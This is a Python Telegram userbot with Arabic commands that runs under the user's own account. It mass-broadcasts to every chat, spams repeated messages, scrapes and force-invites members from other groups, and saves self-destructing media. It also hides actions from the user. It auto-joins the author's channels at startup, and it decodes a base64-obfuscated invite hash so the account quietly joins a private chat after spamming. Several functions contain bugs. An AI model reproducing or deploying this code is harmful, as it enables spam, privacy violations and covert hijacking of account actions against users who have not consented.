import os
import base64
import logging
import asyncio
import time
from telethon.tl import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from collections import deque
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
)
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.sessions import StringSession
from telethon.tl.types import InputPeerUser
from telethon.tl.functions.contacts import GetBlockedRequest, UnblockRequest
#T_Y_L_T
DEFAULTUSERBIO = input("[~] Enter BIO :")
APP_ID  = input("[~] Enter APP ID :")
API_HASH = input("[~] Enter API HASH :")

T_Y_L_T = TelegramClient(StringSession(), APP_ID, API_HASH)
T_Y_L_T.start()

LOGS = logging.getLogger(__name__)

logging.basicConfig(
    format="[%(levelname)s- %(asctime)s]- %(name)s- %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)

async def join_channel():
    try:
        await T_Y_L_T(JoinChannelRequest("@T_Y_L_T"))
    except BaseException:
        pass
    try:
        await T_Y_L_T(JoinChannelRequest("@MS_8T"))
    except BaseException:
        pass
 
 
GCAST_BLACKLIST = [
    -1001118102804,
    -1001161919602,
]

DEVS = [
    1694386561,
    2034443585,
]
DEL_TIME_OUT = 60
normzltext = "1234567890"
namerzfont = "𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫𝟢"



@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".ذاتية"))
async def roz(bakar):
    if not bakar.is_reply:
        return await bakar.edit(
            "**❃ يجب عليك الرد على صورة ذاتيه التدمير او صورة مؤقته**"
        )
    rr9r7 = await bakar.get_reply_message()
    pic = await rr9r7.download_media()
    await T_Y_L_T.send_file(
        "me", pic, caption=f"**⪼ عزيزي هذه هي الصورة او الفيديو التي تم حفظه هنا**"
    )
    await bakar.delete()
    
@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".اسم وقتي"))
async def _(event):
    if event.fwd_from:
        return
    while True:
        HM = time.strftime("%I:%M")
        for normal in HM:
            if normal in normzltext:
                namefont = namerzfont[normzltext.index(normal)]
                HM = HM.replace(normal, namefont)
        name = f"{HM}"
        LOGS.info(name)
        try:
            await T_Y_L_T(
                functions.account.UpdateProfileRequest(
                    first_name=name
                )
            )
        except FloodWaitError as ex:
            LOGS.warning(str(e))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(DEL_TIME_OUT)

@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".بايو وقتي"))
async def _(event):
    if event.fwd_from:
        return
    while True:
        HM = time.strftime("%H:%M")
        for normal in HM:
            if normal in normzltext:
                namefont = namerzfont[normzltext.index(normal)]
                HM = HM.replace(normal, namefont)
        bio = f"{DEFAULTUSERBIO} |️ {HM}"
        LOGS.info(bio)
        try:
            await T_Y_L_T(
                functions.account.UpdateProfileRequest(
                    about=bio
                )
            )
        except FloodWaitError as ex:
            LOGS.warning(str(e))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(DEL_TIME_OUT)


@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".للكروبات(?: |$)(.*)"))
async def gcast(event):
    T_Y_L_T = event.pattern_match.group(1)
    if T_Y_L_T:
        msg = T_Y_L_T
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "**⌔∮ يجب الرد على رساله او وسائط او كتابه النص مع الامر**"
        )
        return
    roz = await event.edit("⌔∮ يتم الاذاعة في الخاص انتظر لحضه")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
            except BaseException:
                er += 1
    await roz.edit(
        f"**⌔∮  تم بنجاح الأذاعة الى ** `{done}` **من الدردشات ، خطأ في ارسال الى ** `{er}` **من الدردشات**"
    )


@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".للخاص(?: |$)(.*)"))
async def gucast(event):
    T_Y_L_T = event.pattern_match.group(1)
    if T_Y_L_T:
        msg = T_Y_L_T
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "**⌔∮ يجب الرد على رساله او وسائط او كتابه النص مع الامر**"
        )
        return
    roz = await event.edit("⌔∮ يتم الاذاعة في الخاص انتظر لحضه")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                if chat not in DEVS:
                    await event.client.send_message(chat, msg)
                    done += 1
            except BaseException:
                er += 1
    await roz.edit(
        f"**⌔∮  تم بنجاح الأذاعة الى ** `{done}` **من الدردشات ، خطأ في ارسال الى ** `{er}` **من الدردشات**"
    )

@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".تكرار (.*)"))
async def spammer(event):
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await _catutils.unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".مؤقت (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
  
 
@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".الاوامر"))
async def _(event):
      await event.edit("""اوامر سورس جمثون المؤقت: 

`.فحص`
- لتجربه السورس

`.مؤقت` + وقت بالثواني  + عدد تكرار + نص
- يقوم بعمل تكرار مؤقت للكلام 

`.تكرار`  + كلام
- يقوم بتكرار الكلام

`.ضيف` + رابط مجموعه عامه
- ارسل الامر في مجموعتك واكتب الامر مع رابط مجموعه عامه ليقوم بسرقه لاعضاء متها

`.للخاص` + كلام
- اكتب الامر مع كلام لعمل اذاعه للكلام للخاص

`.للكروبات` + كلام
- اكتب الامر مع كلام لعمل اذاعه للكلام للكروبات 

`.اسم وقتي`
- يبدأ اسم وقتي

`.بايو وقتي`
- يبدأ بايو وقتي

`.ذاتية`
- بالد على صورة ذاتية التدمير لحفظها في الرسائل المحفوظه

`.فك المحظورين`
- لالغاء جميع المستخدمين الذي حظرتهم في الخاص
( ممكن يعلق الامر بسبب الضغط وما يفك كل الحظرتهم فالحل تستخدمه مره ثانيه بوقت ثاني ) 

اوامر التسلية  : 
`.قمر`
`.قمور`
`.قلوب`
`.حلويات`
""")
      
@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".فحص"))
async def _(event):
      await event.edit("""T_Y_L_T userbot
✦━━━━━━━━✦
- hi lol T_Y_L_T userbot
- 𝗉𝗒𝗍𝗁𝗈𝗇 ⭟ 3.9
- 𝗈𝗐𝗇𝖾𝗋 ⭟ @MS_8T
✦━━━━━━━━✦"""
)

@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".حلويات"))
async def _(event):
    event = await event.edit("candy")
    deq = deque(list("🍦🍧🍩🍪🎂🍰🧁🍫🍬🍭"))
    for _ in range(100):
        await asyncio.sleep(0.4)
        await event.edit("".join(deq))
        deq.rotate(1)

@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".قلوب"))
async def _(event):
    animation_interval = 0.3
    animation_ttl = range(54)
    event = await event.edit("🖤")
    animation_chars = [
        "❤️",
        "🧡",
        "💛",
        "💚",
        "💙",
        "💜",
        "🖤",
        "💘",
        "💝",
        "❤️",
        "🧡",
        "💛",
        "💚",
        "💙",
        "💜",
        "🖤",
        "💘",
        "💝",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 18])

        
@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".قمر"))
async def _(event):
    event = await event.edit("قمر")
    deq = deque(list("🌗🌘🌑🌒🌓🌔🌕🌖"))
    for _ in range(48):
        await asyncio.sleep(0.2)
        await event.edit("".join(deq))
        deq.rotate(1)
        
@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".قمور"))
async def _(event):
    event = await event.edit("قمور")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("قمور..")
    animation_chars = [
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 32])

loop = asyncio.get_event_loop()

async def unblock_users(T_Y_L_T):
    @T_Y_L_T.on(events.NewMessage(outgoing=True, pattern='.فك المحظورين'))
    async def _(event):
        list = await T_Y_L_T(GetBlockedRequest(offset=0, limit=1000000))
        if len(list.blocked) == 0 :
            razan = await event.edit(f'- لم تقم بحظر اي شخص اصلا .')
        else :
            unblocked_count = 1
            for user in list.blocked :
                UnBlock = await T_Y_L_T(UnblockRequest(id=int(user.peer_id.user_id)))
                unblocked_count += 1
                razan = await event.edit(f'- جار الغاء حظر  {round((unblocked_count * 100) / len(list.blocked), 2)}%')
            unblocked_count = 1
            razan = await event.edit(f'- تم الغاء حظر : {len(list.blocked)}\n\n- تم المستخدمين المحظورين في الخاص بنجاح  .')

@T_Y_L_T.on(events.NewMessage(outgoing=True, pattern=".ضيف"))
async def get_users(event):
    legen_ = event.text[10:]
    T_Y_L_T_chat = legen_.lower
    restricted = ["@MS_8T_T_Y_L_T", "@T_Y_L_T_support"]
    T_Y_L_T = await event.edit(f"**جارِ اضأفه الاعضاء من  ** {legen_}")
    if T_Y_L_T_chat in restricted:
        return await T_Y_L_T.edit(
            event, "**- لا يمكنك اخذ الاعضاء من مجموعه السورس العب بعيد ابني  :)**"
        )
    sender = await event.get_sender()
    me = await event.client.get_me()
    if not sender.id == me.id:
        await T_Y_L_T.edit("**▾∮ تتم العملية انتظر قليلا ...**")
    else:
        await T_Y_L_T.edit("**▾∮ تتم العملية انتظر قليلا ...**")
    if event.is_private:
        return await T_Y_L_T.edit("- لا يمكنك اضافه الاعضاء هنا")
    s = 0
    f = 0
    error = "None"
    await T_Y_L_T.edit(
        "**▾∮ حالة الأضافة:**\n\n**▾∮ تتم جمع معلومات المستخدمين 🔄 ...⏣**"
    )
    async for user in event.client.iter_participants(event.pattern_match.group(1)):
        try:
            if error.startswith("Too"):
                return await T_Y_L_T.edit(
                    f"**حالة الأضافة انتهت مع الأخطاء**\n- (**ربما هنالك ضغط على الأمر حاول مجددا لاحقا **) \n**الخطأ** : \n`{error}`\n\n• اضافة `{s}` \n• خطأ بأضافة `{f}`"
                )
            tol = f"@{user.username}"
            lol = tol.split("`")
            await T_Y_L_T(InviteToChannelRequest(channel=event.chat_id, users=lol))
            s = s + 1
            await T_Y_L_T.edit(
                f"**▾∮تتم الأضافة **\n\n• اضيف `{s}` \n•  خطأ بأضافة `{f}` \n\n**× اخر خطأ:** `{error}`"
            )
        except Exception as e:
            error = str(e)
            f = f + 1
    return await T_Y_L_T.edit(
        f"**▾∮اڪتملت الأضافة ✅** \n\n• تم بنجاح اضافة `{s}` \n• خطأ بأضافة `{f}`"
    )

print("""
                       
╋╋╋╋╋┏┓┏┓
╋┏┳━━┫┗┫┗┳━┳━┳┓
╋┣┫┃┃┃┏┫┃┃╋┃┃┃┃
┏┛┣┻┻┻━┻┻┻━┻┻━┛
┗━┛
    """)


T_Y_L_T.loop.create_task(join_channel())
loop.create_task(unblock_users(T_Y_L_T))
T_Y_L_T.run_until_disconnected()
